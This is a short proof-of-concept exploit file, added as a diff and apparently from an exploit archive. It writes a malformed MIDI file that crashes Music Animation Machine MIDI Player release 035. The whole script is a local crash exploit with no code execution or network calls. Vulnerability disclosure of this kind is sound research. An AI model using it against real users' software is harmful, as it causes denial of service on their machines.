@@ -1,0 +1,23 @@
+# Exploit Title: Music Animation Machine MIDI Player Local Crash PoC
+# Date: 1/3/2011
+# Author: c0d3R'Z
+# Software Link: http://www.musanim.com/player/MAMPlayer2006aug19_035.zip
+# Version: Release 035
+# Tested on: Windows XP SP2 EN (VirtualBox)
+
+ 
+# The application crashes when trys to convert a malformed midi file
+ 
+#!/usr/bin/python
+ 
+buffer     = "\x31\x33\x33\x37" * 1337
+ 
+try:
+    f = open("test.mid",'w')
+    f.write(buffer)
+    f.close()
+ 
+    print " Vulnerable file created!..."
+    print " Open the mid file with the application and Voila!! , it crashes!!\n"
+except:
+    print "[-] Error occured!"
